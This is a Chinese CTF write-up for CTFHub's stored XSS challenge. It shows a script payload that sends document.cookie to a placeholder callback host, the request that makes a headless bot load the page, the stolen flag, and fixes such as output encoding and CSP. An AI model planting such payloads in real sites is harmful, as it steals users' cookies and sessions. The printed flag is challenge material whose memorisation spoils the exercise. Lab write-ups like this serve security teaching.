CTFHub - Web - XSS - 存储型

# CTFHub # Web # XSS # 存储型

一、题目信息

  • 题目名称：XSS Persistent（存储型 XSS）
  • 题目方向：Web - XSS - 存储型
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：利用持久化脚本窃取 Bot Cookie 中的 Flag。

二、漏洞分析

页面提供 Change name 表单，通过 POST 提交 name 参数。提交后的名称会由服务端保存，并在后续访问首页时直接拼接到 HTML 中：

<h1>Hello, <b>test123</b>
</h1>

输入未经过 HTML 实体编码，服务端会原样返回用户提交的标签。写入 <script>...</script> 后再次访问首页，脚本会随页面加载执行，因此存在存储型 XSS。

页面底部的 Send URL to Bot 会将指定 URL 提交到 /submit。Bot 使用 HeadlessChrome 访问该页面，其 Cookie 中包含 Flag。由于会话 Cookie koa.sess 设置了 HttpOnly，真正可被脚本读取的是 flag Cookie。

三、解题步骤

  1. 写入 XSS Payload：向首页提交包含外带脚本的名称： 
    <script>new Image().src='https://your-callback.example/?c='+encodeURIComponent(document.cookie)</script>
    使用 Image 发起 GET 请求，可以避免页面跳转，并将 Cookie 作为查询参数发送到回调地址。
  2. 确认持久化回显：再次访问首页，响应中包含未编码的 <script>： 
    <h1>Hello, <script>new Image().src='...'+encodeURIComponent(document.cookie)</script>
</h1>
  3. 触发 Bot：把首页 URL 提交给 /submit： 
    POST /submit
Content-Type: application/json

{"url":"http://challenge-xxx.sandbox.ctfhub.com:10800/"}
    接口成功返回： 
    {
  "code": 0,
  "msg": "Successfully"
}
  4. 读取回调数据：Bot 加载首页后执行存储的脚本，回调服务收到： 
    GET /?c=flag%3Dctfhub%7B9b7ebd561f467e3f821091e0%7D
    URL 解码后即可得到 flag=ctfhub{9b7ebd561f467e3f821091e0}。

四、最终 Flag

ctfhub{9b7ebd561f467e3f821091e0}

五、解题总结

  • 存储型风险：恶意输入被持久化并进入正常页面响应，任何访问页面的高权限用户都会触发脚本。
  • 外带方式：Bot 环境无法直接查看弹窗，需使用可访问的公网回调地址接收 Cookie。
  • Cookie 限制：HttpOnly Cookie 无法被 JavaScript 读取，但未设置该属性的 Flag Cookie 可以正常外带。
  • 修复建议：按输出上下文执行 HTML 实体编码，禁止直接拼接不可信输入，并部署 CSP 限制脚本和数据外带。
